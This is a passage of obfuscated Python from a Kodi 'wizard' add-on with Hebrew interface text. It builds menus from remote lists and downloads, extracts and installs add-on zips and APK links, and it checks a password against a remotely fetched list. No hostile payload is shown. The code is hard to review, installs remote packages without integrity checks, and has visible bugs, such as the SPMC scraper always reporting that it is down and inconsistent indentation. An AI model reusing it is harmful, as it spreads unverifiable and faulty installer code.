					if not SHOWADULT =='true'and O0O000O0OO000O0OO .lower ()=='yes':continue #line:2037
					O0OOOOO00OOO00OOO =O0OOOOO00OOO00OOO if O0OOOOO00OOO00OOO =='http://'else O0000OO00000000OO #line:2038
					O0OOO000O0OOOOO0O =O0OOO000O0OOOOO0O if O0OOO000O0OOOOO0O =='http://'else OO0O00000OOO0OOO0 #line:2039
					addFile (O000OOO0OO0O000OO if not O000OOO0OO0O000OO ==BUILDTHEME else "[B]%s (Installed)[/B]"%O000OOO0OO0O000OO ,'theme',O0O0O000000OOOOO0 ,O000OOO0OO0O000OO ,description =OO00OOOO00OOO0O0O ,fanart =O0OOO000O0OOOOO0O ,icon =O0OOOOO00OOO00OOO ,themeit =THEME3 )#line:2040
	setView ('files','viewType')#line:2041
def viewThirdList (O0O00O0O00O00OO00 ):#line:2043
	O0OO0O0OO0O00OOOO =eval ('THIRD%sNAME'%O0O00O0O00O00OO00 )#line:2044
	O0OOOO00O0O0000OO =eval ('THIRD%sURL'%O0O00O0O00O00OO00 )#line:2045
	OO0OO00O00O00000O =wiz .workingURL (O0OOOO00O0O0000OO )#line:2046
	if not OO0OO00O00O00000O ==True :#line:2047
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2048
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2049
	else :#line:2050
		O000O0000O000OO00 ,OO00O0000O00OO0O0 =wiz .thirdParty (O0OOOO00O0O0000OO )#line:2051
		addFile ("[B]%s[/B]"%O0OO0O0OO0O00OOOO ,'',themeit =THEME3 )#line:2052
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2053
		if O000O0000O000OO00 :#line:2054
			for O0OO0O0OO0O00OOOO ,O00000O000000000O ,O0OOOO00O0O0000OO ,OO0O0OO0OOO0O0000 ,O0O0OO000O00O000O ,OO0OOOO00OO00O000 ,OOO0OO0000OOO00O0 ,O0O00O0O0O00OO00O in OO00O0000O00OO0O0 :#line:2055
				if not SHOWADULT =='true'and OOO0OO0000OOO00O0 .lower ()=='yes':continue #line:2056
				addFile ("[%s] %s v%s"%(OO0O0OO0OOO0O0000 ,O0OO0O0OO0O00OOOO ,O00000O000000000O ),'installthird',O0OO0O0OO0O00OOOO ,O0OOOO00O0O0000OO ,icon =O0O0OO000O00O000O ,fanart =OO0OOOO00OO00O000 ,description =O0O00O0O0O00OO00O ,themeit =THEME2 )#line:2057
		else :#line:2058
			for O0OO0O0OO0O00OOOO ,O0OOOO00O0O0000OO ,O0O0OO000O00O000O ,OO0OOOO00OO00O000 ,O0O00O0O0O00OO00O in OO00O0000O00OO0O0 :#line:2059
				addFile (O0OO0O0OO0O00OOOO ,'installthird',O0OO0O0OO0O00OOOO ,O0OOOO00O0O0000OO ,icon =O0O0OO000O00O000O ,fanart =OO0OOOO00OO00O000 ,description =O0O00O0O0O00OO00O ,themeit =THEME2 )#line:2060
def editThirdParty (O000OO00000O0O00O ):#line:2062
	OOOOOOO00O0OOO0OO =eval ('THIRD%sNAME'%O000OO00000O0O00O )#line:2063
	OO0000OOO00OO0OOO =eval ('THIRD%sURL'%O000OO00000O0O00O )#line:2064
	OOOOOO0O000OO0OOO =wiz .getKeyboard (OOOOOOO00O0OOO0OO ,'Enter the Name of the Wizard')#line:2065
	OO0OOO0O0000O000O =wiz .getKeyboard (OO0000OOO00OO0OOO ,'Enter the URL of the Wizard Text')#line:2066
	wiz .setS ('wizard%sname'%O000OO00000O0O00O ,OOOOOO0O000OO0OOO )#line:2068
	wiz .setS ('wizard%surl'%O000OO00000O0O00O ,OO0OOO0O0000O000O )#line:2069
def apkScraper (name =""):#line:2071
	if name =='kodi':#line:2072
		OO0O00OOOOO0000OO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2073
		O00OO0O0OO0000O0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2074
		O00O00OOOOO0O000O =wiz .openURL (OO0O00OOOOO0000OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2075
		OO00000O0O000000O =wiz .openURL (O00OO0O0OO0000O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2076
		OO0O0OO0O00O00O0O =0 #line:2077
		O00000OOOOOO0O0OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00O00OOOOO0O000O )#line:2078
		O0000O000O00OOO00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO00000O0O000000O )#line:2079
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2081
		O0O00OO00O00000OO =False #line:2082
		for OOOOOOOOO000O0OO0 ,name ,O0OOOOOOOOOOOO00O ,O000000OOOOO0O00O in O00000OOOOOO0O0OO :#line:2083
			if OOOOOOOOO000O0OO0 in ['../','old/']:continue #line:2084
			if not OOOOOOOOO000O0OO0 .endswith ('.apk'):continue #line:2085
			if not OOOOOOOOO000O0OO0 .find ('_')==-1 and O0O00OO00O00000OO ==True :continue #line:2086
			try :#line:2087
				OO0OOO000OOOOO000 =name .split ('-')#line:2088
				if not OOOOOOOOO000O0OO0 .find ('_')==-1 :#line:2089
					O0O00OO00O00000OO =True #line:2090
					O00OOOOOOOOO0OO0O ,O0OO0OOOO00O0O0OO =OO0OOO000OOOOO000 [2 ].split ('_')#line:2091
				else :#line:2092
					O00OOOOOOOOO0OO0O =OO0OOO000OOOOO000 [2 ]#line:2093
					O0OO0OOOO00O0O0OO =''#line:2094
				OO0O000OO0O00OO0O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO000OOOOO000 [0 ].title (),OO0OOO000OOOOO000 [1 ],O0OO0OOOO00O0O0OO .upper (),O00OOOOOOOOO0OO0O ,COLOR2 ,O0OOOOOOOOOOOO00O .replace (' ',''),COLOR1 ,O000000OOOOO0O00O )#line:2095
				OOOOOOOOO0O00OO00 =urljoin (OO0O00OOOOO0000OO ,OOOOOOOOO000O0OO0 )#line:2096
				addFile (OO0O000OO0O00OO0O ,'apkinstall',"%s v%s%s %s"%(OO0OOO000OOOOO000 [0 ].title (),OO0OOO000OOOOO000 [1 ],O0OO0OOOO00O0O0OO .upper (),O00OOOOOOOOO0OO0O ),OOOOOOOOO0O00OO00 )#line:2097
				OO0O0OO0O00O00O0O +=1 #line:2098
			except :#line:2099
				wiz .log ("Error on: %s"%name )#line:2100
		for OOOOOOOOO000O0OO0 ,name ,O0OOOOOOOOOOOO00O ,O000000OOOOO0O00O in O0000O000O00OOO00 :#line:2102
			if OOOOOOOOO000O0OO0 in ['../','old/']:continue #line:2103
			if not OOOOOOOOO000O0OO0 .endswith ('.apk'):continue #line:2104
			if not OOOOOOOOO000O0OO0 .find ('_')==-1 :continue #line:2105
			try :#line:2106
				OO0OOO000OOOOO000 =name .split ('-')#line:2107
				OO0O000OO0O00OO0O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO000OOOOO000 [0 ].title (),OO0OOO000OOOOO000 [1 ],OO0OOO000OOOOO000 [2 ],COLOR2 ,O0OOOOOOOOOOOO00O .replace (' ',''),COLOR1 ,O000000OOOOO0O00O )#line:2108
				OOOOOOOOO0O00OO00 =urljoin (O00OO0O0OO0000O0O ,OOOOOOOOO000O0OO0 )#line:2109
				addFile (OO0O000OO0O00OO0O ,'apkinstall',"%s v%s %s"%(OO0OOO000OOOOO000 [0 ].title (),OO0OOO000OOOOO000 [1 ],OO0OOO000OOOOO000 [2 ]),OOOOOOOOO0O00OO00 )#line:2110
				OO0O0OO0O00O00O0O +=1 #line:2111
			except :#line:2112
				wiz .log ("Error on: %s"%name )#line:2113
		if OO0O0OO0O00O00O0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2114
	elif name =='spmc':#line:2115
		O0O0OO0OOOO000OO0 ='https://github.com/koying/SPMC/releases'#line:2116
		O00O00OOOOO0O000O =wiz .openURL (O0O0OO0OOOO000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2117
		OO0O0OO0O00O00O0O =0 #line:2118
		O00000OOOOOO0O0OO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O00O00OOOOO0O000O )#line:2119
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2121
		for name ,OO0OO0OO00OOO000O in O00000OOOOOO0O0OO :#line:2123
			O0OO0OOO0O0O00OO0 =''#line:2124
			O0000O000O00OOO00 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO0OO0OO00OOO000O )#line:2125
			for OO0OO0000OO00O0OO ,OOO000OOO000O0OO0 ,O0000OOOOOO0O0O0O in O0000O000O00OOO00 :#line:2126
				if O0000OOOOOO0O0O0O .find ('armeabi')==-1 :continue #line:2127
				if O0000OOOOOO0O0O0O .find ('launcher')>-1 :continue #line:2128
				O0OO0OOO0O0O00OO0 =urljoin ('https://github.com',OO0OO0000OO00O0OO )#line:2129
				break #line:2130
		if OO0O0OO0O00O00O0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2132
def apkMenu (url =None ):#line:2134
	if url ==None :#line:2135
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2138
	if not APKFILE =='http://':#line:2139
		if url ==None :#line:2140
			OO00O00O0OOO000O0 =wiz .workingURL (APKFILE )#line:2141
			O0OO0O00000000000 =uservar .APKFILE #line:2142
		else :#line:2143
			OO00O00O0OOO000O0 =wiz .workingURL (url )#line:2144
			O0OO0O00000000000 =url #line:2145
		if OO00O00O0OOO000O0 ==True :#line:2146
			OO0000OO0OOOOOO00 =wiz .openURL (O0OO0O00000000000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2147
			OO0OOOO00O00OO000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0000OO0OOOOOO00 )#line:2148
			if len (OO0OOOO00O00OO000 )>0 :#line:2149
				OO00OO0OOO0OOO00O =0 #line:2150
				for O00OO0000000O0OOO ,OO00O0O0O0OO0O000 ,url ,O0000OO0OO000000O ,O00OO000O00OOO0OO ,OO00O0O00O00O00O0 ,O0O0O0O0O00OOOOOO in OO0OOOO00O00OO000 :#line:2151
					if not SHOWADULT =='true'and OO00O0O00O00O00O0 .lower ()=='yes':continue #line:2152
					if OO00O0O0O0OO0O000 .lower ()=='yes':#line:2153
						OO00OO0OOO0OOO00O +=1 #line:2154
						addDir ("[B]%s[/B]"%O00OO0000000O0OOO ,'apk',url ,description =O0O0O0O0O00OOOOOO ,icon =O0000OO0OO000000O ,fanart =O00OO000O00OOO0OO ,themeit =THEME3 )#line:2155
					else :#line:2156
						OO00OO0OOO0OOO00O +=1 #line:2157
						addFile (O00OO0000000O0OOO ,'apkinstall',O00OO0000000O0OOO ,url ,description =O0O0O0O0O00OOOOOO ,icon =O0000OO0OO000000O ,fanart =O00OO000O00OOO0OO ,themeit =THEME2 )#line:2158
					if OO00OO0OOO0OOO00O <1 :#line:2159
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2160
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2161
		else :#line:2162
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2163
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2164
			addFile ('%s'%OO00O00O0OOO000O0 ,'',themeit =THEME3 )#line:2165
		return #line:2166
	else :wiz .log ("[APK Menu] No APK list added.")#line:2167
	setView ('files','viewType')#line:2168
def addonMenu (url =None ):#line:2170
	if not ADDONFILE =='http://':#line:2171
		if url ==None :#line:2172
			OO0OOOO000OOOOO00 =wiz .workingURL (ADDONFILE )#line:2173
			O00OO0OOOO0OO0OO0 =uservar .ADDONFILE #line:2174
		else :#line:2175
			OO0OOOO000OOOOO00 =wiz .workingURL (url )#line:2176
			O00OO0OOOO0OO0OO0 =url #line:2177
		if OO0OOOO000OOOOO00 ==True :#line:2178
			OOOO00OO0O00OOO00 =wiz .openURL (O00OO0OOOO0OO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2179
			O0OO000O000O00O00 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO00OO0O00OOO00 )#line:2180
			if len (O0OO000O000O00O00 )>0 :#line:2181
				OOO0OO0000OOO0O00 =0 #line:2182
				for OO00O00OO00OO0OO0 ,OO0OOOOOO00OOOO00 ,url ,OO00O0OOOOOO0O0O0 ,O0O0OOO00O0O0O00O ,OOOOO00O0O00O000O ,O0OOOO000OO0OOOOO ,O0O00OO00000O00O0 ,OO0OO0O00OO00OO00 ,O0OO00000O00OO0OO in O0OO000O000O00O00 :#line:2183
					if OO0OOOOOO00OOOO00 .lower ()=='section':#line:2184
						OOO0OO0000OOO0O00 +=1 #line:2185
						addDir ("[B]%s[/B]"%OO00O00OO00OO0OO0 ,'addons',url ,description =O0OO00000O00OO0OO ,icon =O0OOOO000OO0OOOOO ,fanart =O0O00OO00000O00O0 ,themeit =THEME3 )#line:2186
					else :#line:2187
						if not SHOWADULT =='true'and OO0OO0O00OO00OO00 .lower ()=='yes':continue #line:2188
						try :#line:2189
							OO0OOOOOOOO0O0OOO =xbmcaddon .Addon (id =OO0OOOOOO00OOOO00 ).getAddonInfo ('path')#line:2190
							if os .path .exists (OO0OOOOOOOO0O0OOO ):#line:2191
								OO00O00OO00OO0OO0 ="[COLOR green][Installed][/COLOR] %s"%OO00O00OO00OO0OO0 #line:2192
						except :#line:2193
							pass #line:2194
						OOO0OO0000OOO0O00 +=1 #line:2195
						addFile (OO00O00OO00OO0OO0 ,'addoninstall',OO0OOOOOO00OOOO00 ,O00OO0OOOO0OO0OO0 ,description =O0OO00000O00OO0OO ,icon =O0OOOO000OO0OOOOO ,fanart =O0O00OO00000O00O0 ,themeit =THEME2 )#line:2196
					if OOO0OO0000OOO0O00 <1 :#line:2197
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2198
			else :#line:2199
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2200
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2201
		else :#line:2202
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2203
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2204
			addFile ('%s'%OO0OOOO000OOOOO00 ,'',themeit =THEME3 )#line:2205
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2206
	setView ('files','viewType')#line:2207
def addonInstaller (OO0OO00000O0O00OO ,O000OOOOOOO00OOOO ):#line:2209
	if not ADDONFILE =='http://':#line:2210
		O0O00OO0OOOOOOOOO =wiz .workingURL (O000OOOOOOO00OOOO )#line:2211
		if O0O00OO0OOOOOOOOO ==True :#line:2212
			OO0O0O0O0O00OO00O =wiz .openURL (O000OOOOOOO00OOOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2213
			O0O00O00000000OOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0OO00000O0O00OO ).findall (OO0O0O0O0O00OO00O )#line:2214
			if len (O0O00O00000000OOO )>0 :#line:2215
				for OOOOO000O00O000OO ,O000OOOOOOO00OOOO ,OO0OOOOOO00O00OO0 ,OOOO00OO0OOO00OO0 ,O0OO00OOOOOOO0OOO ,OO00OOO0OO0O000OO ,OOO0OOO00000O0O00 ,OO000OOO0000000OO ,OO00O000000000OO0 in O0O00O00000000OOO :#line:2216
					if os .path .exists (os .path .join (ADDONS ,OO0OO00000O0O00OO )):#line:2217
						OO0OOO000OO000O0O =['Launch Addon','Remove Addon']#line:2218
						O000O0OO00O000O00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0OOO000OO000O0O )#line:2219
						if O000O0OO00O000O00 ==0 :#line:2220
							wiz .ebi ('RunAddon(%s)'%OO0OO00000O0O00OO )#line:2221
							xbmc .sleep (1000 )#line:2222
							return True #line:2223
						elif O000O0OO00O000O00 ==1 :#line:2224
							wiz .cleanHouse (os .path .join (ADDONS ,OO0OO00000O0O00OO ))#line:2225
							try :wiz .removeFolder (os .path .join (ADDONS ,OO0OO00000O0O00OO ))#line:2226
							except :pass #line:2227
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0OO00000O0O00OO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2228
								removeAddonData (OO0OO00000O0O00OO )#line:2229
							wiz .refresh ()#line:2230
							return True #line:2231
						else :#line:2232
							return False #line:2233
					O00OOOOOO00OOO0O0 =os .path .join (ADDONS ,OO0OOOOOO00O00OO0 )#line:2234
					if not OO0OOOOOO00O00OO0 .lower ()=='none'and not os .path .exists (O00OOOOOO00OOO0O0 ):#line:2235
						wiz .log ("Repository not installed, installing it")#line:2236
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO0OO00000O0O00OO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0OOOOOO00O00OO0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2237
							O0000OO00O000000O =wiz .parseDOM (wiz .openURL (OOOO00OO0OOO00OO0 ),'addon',ret ='version',attrs ={'id':OO0OOOOOO00O00OO0 })#line:2238
							if len (O0000OO00O000000O )>0 :#line:2239
								OOO0000O0OOOO0OOO ='%s%s-%s.zip'%(O0OO00OOOOOOO0OOO ,OO0OOOOOO00O00OO0 ,O0000OO00O000000O [0 ])#line:2240
								wiz .log (OOO0000O0OOOO0OOO )#line:2241
								if KODIV >=17 :wiz .addonDatabase (OO0OOOOOO00O00OO0 ,1 )#line:2242
								installAddon (OO0OOOOOO00O00OO0 ,OOO0000O0OOOO0OOO )#line:2243
								wiz .ebi ('UpdateAddonRepos()')#line:2244
								wiz .log ("Installing Addon from Kodi")#line:2246
								O000O0OO0OOO0O0O0 =installFromKodi (OO0OO00000O0O00OO )#line:2247
								wiz .log ("Install from Kodi: %s"%O000O0OO0OOO0O0O0 )#line:2248
								if O000O0OO0OOO0O0O0 :#line:2249
									wiz .refresh ()#line:2250
									return True #line:2251
							else :#line:2252
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO0OOOOOO00O00OO0 )#line:2253
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO0OO00000O0O00OO ,OO0OOOOOO00O00OO0 ))#line:2254
					elif OO0OOOOOO00O00OO0 .lower ()=='none':#line:2255
						wiz .log ("No repository, installing addon")#line:2256
						OOO0O00OOO00OOOO0 =OO0OO00000O0O00OO #line:2257
						OO00O0000OO00O0OO =O000OOOOOOO00OOOO #line:2258
						installAddon (OO0OO00000O0O00OO ,O000OOOOOOO00OOOO )#line:2259
						wiz .refresh ()#line:2260
						return True #line:2261
					else :#line:2262
						wiz .log ("Repository installed, installing addon")#line:2263
						O000O0OO0OOO0O0O0 =installFromKodi (OO0OO00000O0O00OO ,False )#line:2264
						if O000O0OO0OOO0O0O0 :#line:2265
							wiz .refresh ()#line:2266
							return True #line:2267
					if os .path .exists (os .path .join (ADDONS ,OO0OO00000O0O00OO )):return True #line:2268
					OO000OOOOO0O0O000 =wiz .parseDOM (wiz .openURL (OOOO00OO0OOO00OO0 ),'addon',ret ='version',attrs ={'id':OO0OO00000O0O00OO })#line:2269
					if len (OO000OOOOO0O0O000 )>0 :#line:2270
						O000OOOOOOO00OOOO ="%s%s-%s.zip"%(O000OOOOOOO00OOOO ,OO0OO00000O0O00OO ,OO000OOOOO0O0O000 [0 ])#line:2271
						wiz .log (str (O000OOOOOOO00OOOO ))#line:2272
						if KODIV >=17 :wiz .addonDatabase (OO0OO00000O0O00OO ,1 )#line:2273
						installAddon (OO0OO00000O0O00OO ,O000OOOOOOO00OOOO )#line:2274
						wiz .refresh ()#line:2275
					else :#line:2276
						wiz .log ("no match");return False #line:2277
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2278
		else :wiz .log ("[Addon Installer] Text File: %s"%O0O00OO0OOOOOOOOO )#line:2279
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2280
def installFromKodi (OO00000OOOOOO0OOO ,over =True ):#line:2282
	if over ==True :#line:2283
		xbmc .sleep (2000 )#line:2284
	wiz .ebi ('RunPlugin(plugin://%s)'%OO00000OOOOOO0OOO )#line:2286
	if not wiz .whileWindow ('yesnodialog'):#line:2287
		return False #line:2288
	xbmc .sleep (1000 )#line:2289
	if wiz .whileWindow ('okdialog'):#line:2290
		return False #line:2291
	wiz .whileWindow ('progressdialog')#line:2292
	if os .path .exists (os .path .join (ADDONS ,OO00000OOOOOO0OOO )):return True #line:2293
	else :return False #line:2294
def installAddon (O00OO0O000O00OO00 ,OO0OO0O0O000O0OOO ):#line:2296
	if not wiz .workingURL (OO0OO0O0O000O0OOO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O00OO0O000O00OO00 ,COLOR2 ));return #line:2297
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2298
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0O000O00OO00 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2299
	OOOOOO0OO00O0O0O0 =OO0OO0O0O000O0OOO .split ('/')#line:2300
	O0O0O00000O0OOOO0 =os .path .join (PACKAGES ,OOOOOO0OO00O0O0O0 [-1 ])#line:2301
	try :os .remove (O0O0O00000O0OOOO0 )#line:2302
	except :pass #line:2303
	downloader .download (OO0OO0O0O000O0OOO ,O0O0O00000O0OOOO0 ,DP )#line:2304
	O00OOOOO00OOOOOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0O000O00OO00 )#line:2305
	DP .update (0 ,O00OOOOO00OOOOOOO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2306
	OO00O0OOOO000O00O ,O000O0OO0O0OOOO00 ,OOO00O0O000O0OO0O =extract .all (O0O0O00000O0OOOO0 ,ADDONS ,DP ,title =O00OOOOO00OOOOOOO )#line:2307
	DP .update (0 ,O00OOOOO00OOOOOOO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2308
	installed (O00OO0O000O00OO00 )#line:2309
	installDep (O00OO0O000O00OO00 ,DP )#line:2310
	DP .close ()#line:2311
	wiz .ebi ('UpdateAddonRepos()')#line:2312
	wiz .ebi ('UpdateLocalAddons()')#line:2313
	wiz .refresh ()#line:2314
def installDep (O0O0OO00O0000O00O ,DP =None ):#line:2316
	O000O0OO00O0000OO =os .path .join (ADDONS ,O0O0OO00O0000O00O ,'addon.xml')#line:2317
	if os .path .exists (O000O0OO00O0000OO ):#line:2318
		OO000O00OOO000O00 =open (O000O0OO00O0000OO ,mode ='r');OO00O0OOO0OO0OO0O =OO000O00OOO000O00 .read ();OO000O00OOO000O00 .close ();#line:2319
		O0O0OO00O0OOOO0OO =wiz .parseDOM (OO00O0OOO0OO0OO0O ,'import',ret ='addon')#line:2320
		for OOOO0O0O000OO0O0O in O0O0OO00O0OOOO0OO :#line:2321
			if not 'xbmc.python'in OOOO0O0O000OO0O0O :#line:2322
				if not DP ==None :#line:2323
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0O0O000OO0O0O ))#line:2324
				wiz .createTemp (OOOO0O0O000OO0O0O )#line:2325
def installed (O000000OO0OOOOOOO ):#line:2352
	OOOO0O0O0OO000000 =os .path .join (ADDONS ,O000000OO0OOOOOOO ,'addon.xml')#line:2353
	if os .path .exists (OOOO0O0O0OO000000 ):#line:2354
		try :#line:2355
			O0O0OO0O0000000O0 =open (OOOO0O0O0OO000000 ,mode ='r');O0O0OO0OO0000000O =O0O0OO0O0000000O0 .read ();O0O0OO0O0000000O0 .close ()#line:2356
			OOO0000OO0OO0O000 =wiz .parseDOM (O0O0OO0OO0000000O ,'addon',ret ='name',attrs ={'id':O000000OO0OOOOOOO })#line:2357
			OOO00OOOO0OOO0OOO =os .path .join (ADDONS ,O000000OO0OOOOOOO ,'icon.png')#line:2358
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0000OO0OO0O000 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOO00OOOO0OOO0OOO )#line:2359
		except :pass #line:2360
def youtubeMenu (url =None ):#line:2362
	if not YOUTUBEFILE =='http://':#line:2363
		if url ==None :#line:2364
			O000OOO0OOO0OO00O =wiz .workingURL (YOUTUBEFILE )#line:2365
			O0000O0OOOOOO0OO0 =uservar .YOUTUBEFILE #line:2366
		else :#line:2367
			O000OOO0OOO0OO00O =wiz .workingURL (url )#line:2368
			O0000O0OOOOOO0OO0 =url #line:2369
		if O000OOO0OOO0OO00O ==True :#line:2370
			O0000OO0O00OOOO0O =wiz .openURL (O0000O0OOOOOO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2371
			OO0O0OO0O0OO0OO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0000OO0O00OOOO0O )#line:2372
			if len (OO0O0OO0O0OO0OO0O )>0 :#line:2373
				for O00OO0OO00OO00000 ,O000000OOO0OOO0O0 ,url ,O00O0OOO0OOOOOOOO ,OOO00O000O000O0O0 ,OOOO0OOO0000OO0OO in OO0O0OO0O0OO0OO0O :#line:2374
					if O000000OOO0OOO0O0 .lower ()=="yes":#line:2375
						addDir ("[B]%s[/B]"%O00OO0OO00OO00000 ,'youtube',url ,description =OOOO0OOO0000OO0OO ,icon =O00O0OOO0OOOOOOOO ,fanart =OOO00O000O000O0O0 ,themeit =THEME3 )#line:2376
					else :#line:2377
						addFile (O00OO0OO00OO00000 ,'viewVideo',url =url ,description =OOOO0OOO0000OO0OO ,icon =O00O0OOO0OOOOOOOO ,fanart =OOO00O000O000O0O0 ,themeit =THEME2 )#line:2378
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2379
		else :#line:2380
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2381
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2382
			addFile ('%s'%O000OOO0OOO0OO00O ,'',themeit =THEME3 )#line:2383
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2384
	setView ('files','viewType')#line:2385
def STARTP ():#line:2386
	OO00OOOOOO00O00OO =(ADDON .getSetting ("pass"))#line:2387
	if BUILDNAME =="":#line:2388
	 if not NOTIFY =='true':#line:2389
          O000OO0O0OOOO00O0 =wiz .workingURL (NOTIFICATION )#line:2390
	 if not NOTIFY2 =='true':#line:2391
          O000OO0O0OOOO00O0 =wiz .workingURL (NOTIFICATION2 )#line:2392
	 if not NOTIFY3 =='true':#line:2393
          O000OO0O0OOOO00O0 =wiz .workingURL (NOTIFICATION3 )#line:2394
	O00O0O00O0OOOOO0O =OO00OOOOOO00O00OO #line:2395
	O000OO0O0OOOO00O0 =urllib2 .Request (SPEED )#line:2396
	O000OO0O0OO00OOO0 =urllib2 .urlopen (O000OO0O0OOOO00O0 )#line:2397
	O0OOOO00OO0000OO0 =O000OO0O0OO00OOO0 .readlines ()#line:2399
	OOOO0O0000O0O00O0 =0 #line:2403
	for O0OO00O0000O00O00 in O0OOOO00OO0000OO0 :#line:2404
		if O0OO00O0000O00O00 .split (' ==')[0 ]==OO00OOOOOO00O00OO or O0OO00O0000O00O00 .split ()[0 ]==OO00OOOOOO00O00OO :#line:2405
			OOOO0O0000O0O00O0 =1 #line:2406
			break #line:2407
	if OOOO0O0000O0O00O0 ==0 :#line:2408
					OO0O0000O0OOO0OOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2409
					if OO0O0000O0OOO0OOO :#line:2411
						ADDON .openSettings ()#line:2413
